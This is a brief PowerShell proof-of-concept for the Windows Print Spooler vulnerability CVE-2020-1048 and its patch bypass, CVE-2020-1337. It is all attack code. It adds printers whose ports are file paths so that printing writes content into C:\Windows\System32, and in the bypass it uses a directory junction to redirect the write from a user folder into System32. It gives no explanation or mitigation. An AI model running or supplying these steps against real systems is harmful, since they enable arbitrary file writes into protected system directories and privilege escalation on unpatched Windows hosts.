# PoC for CVE-2020-1048 (Windows 10 1909 18363.778 x64 (April 2020 patch level))
Add-PrinterDriver -Name "Generic / Text Only" 
Add-PrinterPort -Name "C:\Windows\System32\test.dll" 
Add-Printer -Name "Printer2" -DriverName "Generic / Text Only" -PortName "C:\Windows\System32\test.dll" 
"My content" | Out-Printer -Name "Printer2"

# Patch Bypass: CVE-2020-1337
mkdir "C:\Users\user1\Documents\target" 
Add-PrinterDriver -Name "Generic / Text Only" 
Add-PrinterPort -Name "C:\Users\user1\Documents\target\test3.dll" 
Add-Printer -Name "Printer3" -DriverName "Generic / Text Only" -PortName "C:\Users\user1\Documents\target\test3.dll" 
rmdir "c:\Users\user1\Documents\target" 
cmd /c mklink /J "C:\Users\user1\Documents\target" "C:\Windows\System32" 
"My content" | Out-Printer -Name "Printer3"